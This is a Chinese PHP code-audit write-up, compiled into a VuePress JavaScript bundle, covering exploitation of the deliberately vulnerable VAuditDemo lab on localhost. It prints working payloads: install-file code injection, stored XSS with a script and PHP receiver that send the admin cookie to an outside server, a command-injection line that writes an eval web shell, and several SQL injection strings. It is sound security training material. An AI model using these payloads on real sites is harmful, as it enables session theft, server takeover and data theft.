"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[3578],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,e]of s)a[i]=e;return a}},58081:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>ti,data:()=>li});var e=a(6254);const p=a.p+"assets/img/image-20240925203101-6qi84yv.b949145f.png",t=a.p+"assets/img/image-20240925203230-v9tjdvd.68497202.png",l=a.p+"assets/img/image-20240925204002-o60gd1m.5e47d5f6.png",n=a.p+"assets/img/image-20240925204609-9s8kdcs.00f76e79.png",g=a.p+"assets/img/image-20240925220013-88ed79g.ccb3a6ec.png",h=a.p+"assets/img/image-20240925205341-a93ptbz.0080dc44.png",r=a.p+"assets/img/image-20240925171236-ia3q1et.b75fe7f6.png",d=a.p+"assets/img/image-20240925210228-tekguxx.3b3e18f9.png",k=a.p+"assets/img/image-20240925215237-qzd4km4.f65fdffc.png",m=a.p+"assets/img/image-20240925171256-35s06zq.b802fd88.png",o=a.p+"assets/img/image-20240925170911-v2z9nlp.94cd1ffe.png",c=a.p+"assets/img/image-20240925202436-1uli3cv.b88b4876.png",y=a.p+"assets/img/image-20240925182234-jipay6j.83846a5d.png",A=a.p+"assets/img/image-20240925183427-1k6lknv.ba43f9ae.png",b=a.p+"assets/img/image-20240925192137-enh2n2r.51d8b0a4.png",u=a.p+"assets/img/image-20240926161443-c4p2gdw.aa6a0756.png",B=a.p+"assets/img/image-20240926162419-yjupk72.f89b8ade.png",v=a.p+"assets/img/image-20240926170858-d3z21s6.e4f8e6ec.png",f=a.p+"assets/img/代码审计之XSS-20240926171127-0tah0z9.736ed823.png",z=a.p+"assets/img/image-20240926185358-avzcehn.0a2c77ed.png",F=a.p+"assets/img/image-20240926185836-h7v5etg.33deae7a.png",C=a.p+"assets/img/image-20240927000803-cybwwca.c60d9d11.png",E=a.p+"assets/img/image-20240927000032-xo6z6an.c1dfba93.png",_=a.p+"assets/img/image-20240926235957-73ch7ez.4c03ee80.png",x=a.p+"assets/img/image-20240927000623-9sjr14n.476b686e.png",S=a.p+"assets/img/image-20240927000640-xqa67bd.35031be3.png",D=a.p+"assets/img/image-20240927000702-idt2sw5.32f91f49.png",P=a.p+"assets/img/image-20240926193234-u6kl043.117c7755.png",q=a.p+"assets/img/image-20240926193335-d84e4y5.adce18d3.png",j=a.p+"assets/img/image-20240926193403-hfbvezz.15592915.png",H=a.p+"assets/img/image-20240926194019-jrums4i.519c6f56.png",L=a.p+"assets/img/image-20240926200103-el10r75.4bcb4203.png",T=a.p+"assets/img/image-20240926200801-e90o8qx.42eebcd5.png",Q=a.p+"assets/img/image-20240926200305-2u1xx9u.27f42e70.png",w=a.p+"assets/img/image-20240926201250-ii7goys.fbb28cbb.png",X=a.p+"assets/img/image-20240926202114-8yspv4j.44ae32be.png",$=a.p+"assets/img/image-20240926202417-knrgmvc.04274b32.png",N=a.p+"assets/img/image-20240926203453-m1mj4ce.185342e5.png",O=a.p+"assets/img/代码审计sql-20240926205456-lr2mmfk.f02b418a.png",V=a.p+"assets/img/image-20240926214153-zkbb6qk.b3508be7.png",Z=a.p+"assets/img/image-20240926215917-cdf4ffv.f5418726.png",I=a.p+"assets/img/image-20240926210316-nagkda0.41dc2707.png",R=a.p+"assets/img/image-20240926220847-jkmvm5c.ea70dc4b.png",U=a.p+"assets/img/image-20240927162537-zu5zp6v.8465c542.png",W=a.p+"assets/img/image-20240927162755-hvt2l9l.a0ba3254.png",G=a.p+"assets/img/image-20240927163128-cem8pau.039517f7.png",J=a.p+"assets/img/image-20240927164043-g9md01w.fd8d4d11.png",M=a.p+"assets/img/image-20240927164544-1ilg9sr.047dfb92.png",K=a.p+"assets/img/image-20240928103230-o3rti2e.1d478be4.png",Y=a.p+"assets/img/image-20240928104317-ag5x02u.c556100e.png",ii=a.p+"assets/img/image-20240928105414-zl725cj.8fe6cc75.png",si=a.p+"assets/img/image-20240928115809-srvjxcb.48230c14.png",ai=a.p+"assets/img/image-20240928120111-nhkj6u7.9dc2096f.png",ei=a.p+"assets/img/image-20240928115853-buowfge.d4e914f9.png",pi={},ti=(0,a(81021).A)(pi,[["render",function(i,s){return(0,e.uX)(),(0,e.CE)("div",null,s[0]||(s[0]=[(0,e.Fv)('<h1 id="php代码审计" tabindex="-1"><a class="header-anchor" href="#php代码审计"><span>PHP代码审计</span></a></h1><p>靶场 <a href="https://github.com/virink/VAuditDemo" target="_blank" rel="noopener noreferrer">VAuditDemo</a></p><h3 id="安装漏洞" tabindex="-1"><a class="header-anchor" href="#安装漏洞"><span>安装漏洞</span></a></h3><p>​<img src="'+p+'" alt="image" title="install.php" loading="lazy">​</p><p>​<img src="'+t+'" alt="image" loading="lazy">​</p><p>​<img src="'+l+'" alt="image" title="config.php" loading="lazy">​</p><p>​<img src="'+n+'" alt="image" loading="lazy">​</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>由此可发现，用户前端连接数据库的代码没有进行特殊字符过滤就传入文件操作。所以存在安装漏洞。</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p><span data-type="text" style="color:var(--b3-font-color10);">这条语句 </span><code>dbname=ssss--- -&quot;;phpinfo();//</code>​<span data-type="text" style="color:var(--b3-font-color10);"> 除了会出现在php页面，还会出现在SQL语句里,所以要在SQL语句里加SQL的注释，保证SQL语句正常执行，否则SQL执行时会因为 </span><code> &quot;;phpinfo();//</code>​<span data-type="text" style="color:var(--b3-font-color10);">的存在而报错，要把这部分给注释。</span></p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><p>语句被带到数据库执行，若报错，install.php也会报错</p><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>‍</p><p>​<img src="'+c+'" alt="image" title="/admin/login.php" loading="lazy">​</p><h3 id="命令执行漏洞" tabindex="-1"><a class="header-anchor" href="#命令执行漏洞"><span>命令执行漏洞</span></a></h3><p>自动审计，发现命令执行漏洞。</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><p>溯源找到源码</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>验证其存在。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><h3 id="存储型xss" tabindex="-1"><a class="header-anchor" href="#存储型xss"><span>存储型XSS</span></a></h3><p>1、XSS漏洞审计过程及思路，同时使用存储型XSS获取管理员cookie到第三方服务器中，利用cookie登录管理员账号，获取shell (ping.php)</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><p>​<img src="'+f+'" alt="代码审计之XSS" loading="lazy">​</p><p>通过普通用户登录时抓包，在client-ip 中写payload。</p><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>当管理员打开用户管理界面时获取到cookie，实际情况应该将cookie发送到第三方服务器。但是引号’‘’总是被过滤</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p>写入第三方服务器方法</p><p>在第三方服务器创建两个文件</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><div class="language-js line-numbers-mode" data-highlighter="shiki" data-ext="js" data-title="js" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//getcookie.js</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">let</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> cookie</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cookie</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">let</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> last</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;&lt;img src=&quot;http://getcookie/getcookie.php?cookie=&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">cookie</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&gt;&#39;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">last</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//getcookie.php</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>\n<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cookie&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];  </span></span>\n<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">file_put_contents</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cookies.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> FILE_APPEND</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);  </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>留言页面从client_ip获取ip时注入XSS，script代码执行。注意src可以不写”“。所以绕过’‘”的方法就是不写&#39;&quot;</p><p>​<img src="'+_+'" alt="image" loading="lazy">​</p><p>script请求了第三方服务器的js文件，js代码执行将img标签写入页面，img渲染时请求，并将cookie以get方式携带出去。</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><p>在第三方服务器接收get请求，并将cookie值写入文件。</p><p>​<img src="'+S+'" alt="image" loading="lazy">​</p><p>到此，管理员cookie被获取。</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p><p>‍</p><h4 id="盗用cookie登录admin" tabindex="-1"><a class="header-anchor" href="#盗用cookie登录admin"><span>盗用cookie登录admin</span></a></h4><p>PHPSESSID=b4nhbnmd455rv1cdfbap5dlig1</p><p><a href="http://localhost/admin/manageUser.php" target="_blank" rel="noopener noreferrer">http://localhost/admin/manageUser.php</a></p><p>把浏览器cookie清空。</p><p>​<img src="'+P+'" alt="image" loading="lazy">​</p><p>配置管理员cookie。当cookie不对时找不到。</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><p>使用正确的管理员cookie后进入管理员界面。</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><p>获取shell，利用ping里的命令执行。</p><p>​<img src="'+H+'" alt="image" loading="lazy">​</p><div class="language-payload line-numbers-mode" data-highlighter="shiki" data-ext="payload" data-title="payload" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>xx || echo ^&lt;?php @eval($_POST[cmd]); ?^&gt; &gt; ../shell.php</span></span>\n<span class="line"><span>?、&lt;、&gt;等字符在cmd中有特殊含义，会被转义</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用上方命令写个后门。</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p><p>​<img src="'+T+'" alt="image" loading="lazy">​</p><p>Ant连接。</p><p>​<img src="'+Q+'" alt="image" loading="lazy">​</p><h3 id="sql注入" tabindex="-1"><a class="header-anchor" href="#sql注入"><span>SQL注入</span></a></h3><p>2、审计靶场中的SQL注入（不设上限，最少1个）</p><p>搜下和数据库连接相关文件。</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>在通过数据库查询数据库详细信息的messageDetail.php页面，查询参数通过sqlwaf过滤不严格导致sql注入。</p><p>​<img src="'+X+'" alt="image" loading="lazy">​</p><div class="language-payload line-numbers-mode" data-highlighter="shiki" data-ext="payload" data-title="payload" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>http://localhost/messageDetail.php?id=7%20uni||on%20sele||ct%20database(),user(),version(),4#</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+$+'" alt="image" loading="lazy">​</p><h3 id="二次注入" tabindex="-1"><a class="header-anchor" href="#二次注入"><span>二次注入</span></a></h3><p>​<img src="'+N+'" alt="image" loading="lazy">​</p><p>查看留言提交界面发现，数据仅用clean_message函数过滤。而在该函数里又调用<code>mysql_real_escape_string</code>​过滤。</p><p>​<img src="'+O+'" alt="代码审计sql" loading="lazy">​</p><p>往下发现用户名从数据库得到，而用户名的过滤同样和message过滤函数一样，使用clean_input函数再调用<code>mysql_real_escape_string</code>​过滤。显然用户名过滤也不严格。</p><p>​<img src="'+V+'" alt="image" loading="lazy">通过查询留言的sql语句即可构造payload，然后再在用户名位置和留言位置构造相应语句即可实现注入。</p><p>​<img src="'+Z+'" alt="image" loading="lazy">​</p><p>注册用户，并用\\转义掉一个’，后面#注释掉一个‘。</p><p>​<img src="'+I+'" alt="image" loading="lazy">​</p><div class="language-payload line-numbers-mode" data-highlighter="shiki" data-ext="payload" data-title="payload" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>,database(),now())#</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+R+'" alt="image" loading="lazy">​</p><p>作业： 1、审计靶场内的任意文件读取漏洞，说明其思路和验证方式</p><h3 id="任意文件读取漏洞" tabindex="-1"><a class="header-anchor" href="#任意文件读取漏洞"><span>任意文件读取漏洞</span></a></h3><p>file_get_contents() 函数在文件操作中的主要作用是读取本地文件的内容</p><p>​<img src="'+U+'" alt="image" loading="lazy">​</p><p>file_get_contents() 函数在文件操作中的主要作用是读取本地文件的内容</p><p>​<img src="'+W+'" alt="image" loading="lazy">​</p><p>全局搜索session</p><p>​<img src="'+G+'" alt="image" loading="lazy">​</p><p>转到logcheck.php</p><p>​<img src="'+J+'" alt="image" loading="lazy">​</p><p>转到regcheck.php</p><p>​<img src="'+M+'" alt="image" loading="lazy">​</p><p>转到updateavatar.php</p><p>​<img src="'+K+'" alt="image" loading="lazy">​</p><p>转到$_FILE</p><p>​<img src="'+Y+'" alt="image" loading="lazy">​</p><p>转到is_pic()</p><p>​<img src="'+ii+'" alt="image" loading="lazy">​</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">UPDATE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> users </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">SET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_avatar </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;$avatar&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> WHERE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_id </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{$_SESSION[&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user_id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;]}&#39;</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">UPDATE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> users </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">SET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_avatar </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;1.png&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,user_avatar</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;login.php&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> WHERE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> user_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;111&#39;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> -- .jpg&#39; WHERE user_id = &#39;{$_SESSION[&#39;user_id&#39;]}&#39;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">#</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">前面的1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">png用于闭合单引号</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">，再写一个user_avatar</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;login.php&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">用于覆盖前面的1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">png</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">，最后的</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">-- 用于注释后面的语句，由于is_pic()要检查文件后缀，所以最后要带上.jpg</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>构造poayload发送</p><p>​<img src="'+si+'" alt="image" loading="lazy">​</p><p>头像路径已被更改。</p><p>​<img src="'+ai+'" alt="image" loading="lazy">​</p><p><span data-type="text" style="color:var(--b3-font-color10);">重新登录</span>刷新后访问<a href="http://localhost/user/avatar.php%EF%BC%8C%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%E3%80%82" target="_blank" rel="noopener noreferrer">http://localhost/user/avatar.php，抓包查看。</a></p><p>​<img src="'+ei+'" alt="image" loading="lazy">​</p><p>‍</p>',113)]))}]]),li=JSON.parse('{"path":"/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html","title":"PHP代码审计","lang":"zh-CN","frontmatter":{"title":"PHP代码审计","index":true,"icon":"p","isOriginal":true,"date":"2023-09-18T00:00:00.000Z","order":12,"category":["渗透测试"],"tag":["渗透测试","PHP代码审计"],"description":"PHP代码审计 靶场 VAuditDemo 安装漏洞 ​image​ ​image​ ​image​ ​image​ ​image​ ​image​ 由此可发现，用户前端连接数据库的代码没有进行特殊字符过滤就传入文件操作。所以存在安装漏洞。 ​image​ 这条语句 dbname=ssss--- -\\";phpinfo();//​ 除了会出现在php页面...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"PHP代码审计"}],["meta",{"property":"og:description","content":"PHP代码审计 靶场 VAuditDemo 安装漏洞 ​image​ ​image​ ​image​ ​image​ ​image​ ​image​ 由此可发现，用户前端连接数据库的代码没有进行特殊字符过滤就传入文件操作。所以存在安装漏洞。 ​image​ 这条语句 dbname=ssss--- -\\";phpinfo();//​ 除了会出现在php页面..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"PHP代码审计"}],["meta",{"property":"article:published_time","content":"2023-09-18T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"PHP代码审计\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-09-18T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":3,"title":"安装漏洞","slug":"安装漏洞","link":"#安装漏洞","children":[]},{"level":3,"title":"命令执行漏洞","slug":"命令执行漏洞","link":"#命令执行漏洞","children":[]},{"level":3,"title":"存储型XSS","slug":"存储型xss","link":"#存储型xss","children":[]},{"level":3,"title":"SQL注入","slug":"sql注入","link":"#sql注入","children":[]},{"level":3,"title":"二次注入","slug":"二次注入","link":"#二次注入","children":[]},{"level":3,"title":"任意文件读取漏洞","slug":"任意文件读取漏洞","link":"#任意文件读取漏洞","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":4.35,"words":1304},"filePathRelative":"perm/漏洞专题/PHP代码审计.md","localizedDate":"2023年9月18日","excerpt":"\\n<p>靶场 <a href=\\"https://github.com/virink/VAuditDemo\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">VAuditDemo</a></p>\\n<h3>安装漏洞</h3>\\n<p>​​</p>\\n<p>​​</p>\\n<p>​​</p>\\n<p>​​</p>\\n<p>​​</p>\\n<p>​​</p>\\n<p>由此可发现，用户前端连接数据库的代码没有进行特殊字符过滤就传入文件操作。所以存在安装漏洞。</p>\\n<p>​​</p>\\n<p><span data-type=\\"text\\" style=\\"color: var(--b3-font-color10);\\">这条语句   </span><code>dbname=ssss--- -\\";phpinfo();//</code>​<span data-type=\\"text\\" style=\\"color: var(--b3-font-color10);\\">   除了会出现在php页面，还会出现在SQL语句里,所以要在SQL语句里加SQL的注释，保证SQL语句正常执行，否则SQL执行时会因为   </span><code> \\";phpinfo();//</code>​<span data-type=\\"text\\" style=\\"color: var(--b3-font-color10);\\">的存在而报错，要把这部分给注释。</span></p>","autoDesc":true}')}}]);